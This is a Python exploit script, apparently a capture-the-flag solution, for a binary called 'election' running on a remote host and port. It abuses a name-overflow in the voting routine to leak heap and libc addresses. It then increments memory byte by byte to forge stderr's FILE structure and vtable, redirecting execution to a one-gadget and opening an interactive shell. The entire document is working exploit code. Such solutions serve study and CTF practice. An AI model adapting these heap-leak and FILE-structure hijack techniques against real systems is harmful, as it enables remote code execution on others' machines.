#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './election'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'59.106.221.216', 'port':28349})
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_main           = binf.sep_function['main']
addr_bss            = binf.sep_section['.bss']
addr_buf            = addr_bss + 0x20

libc = binf.libc
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    el = Election(conn)

    el.stand(p64(addr_got_main))

    for i in range(0x20):
        el.vote('yes\x00'+'a'*0x1c, True)

    conn.sendlineafter('>> ', '2')
    conn.sendlineafter('(Y/n) ', 'y')
    conn.recvuntil('Shinonome\n* ')
    addr_heap_base = u(conn.recvuntil('\n', drop=True)) - 0x70
    info('addr_heap_base   = 0x{:08x}'.format(addr_heap_base))

    conn.sendlineafter('>> ', 'hoge')

    set_value(el, addr_heap_base+0x58, addr_heap_base+0x10, addr_heap_base+0xf0)

    conn.sendlineafter('>> ', '2')
    conn.sendlineafter('(Y/n) ', 'y')
    conn.recvuntil('Shinonome\n* ')
    addr_libc_main      = u(conn.recvuntil('\n', drop=True))
    libc.address        = addr_libc_main - offset_libc_main
    addr_libc_stderr    = libc.symbols['_IO_2_1_stderr_']
    addr_libc_io_wide   = addr_libc_stderr - 0xee0 #libc.symbols['_IO_wide_data_2']
    addr_libc_io_jumps  = libc.symbols['_IO_file_jumps']
    addr_libc_one_rce   = libc.address + 0x4526a
    info('addr_libc_base   = 0x{:08x}'.format(libc.address))

    conn.sendlineafter('>> ', 'hoge')

    set_value(el, addr_libc_stderr+0xc0, 0, 1)
    set_value(el, addr_libc_io_wide+0x20, 0, 1)
    set_value(el, addr_buf+0x18, 0, addr_libc_one_rce)
    set_value(el, addr_libc_stderr+0xd8, addr_libc_io_jumps, addr_buf)

    conn.sendline('0')

def increment(el, addr, x):
    el.vote('yes\x00'+'a'*0x1c+p64(addr-0x10)+chr(x), True)

def set_value(el, addr, org, new):
    for i in range(8):
        o = (org >> i*8) & 0xff
        n = (new >> i*8) & 0xff
        if n < o:
            n += 0x100
            new -= 1 << (i+1)*8
        diff = n-o

        while diff > 0x7f:
            increment(el, addr+i, 0x7f)
            diff -= 0x7f

        if diff:
            increment(el, addr+i, diff)

class Election:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def stand(self, name):
        self.sendlineafter('>> ', '1')
        self.sendafter('>> ', name)

    def vote(self, name, overwrite = False):
        self.sendlineafter('>> ', '2')
        self.sendlineafter('(Y/n) ', 'n')

        if overwrite:
            self.sendafter('>> ', 'oshima')

        self.sendafter('>> ', name)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
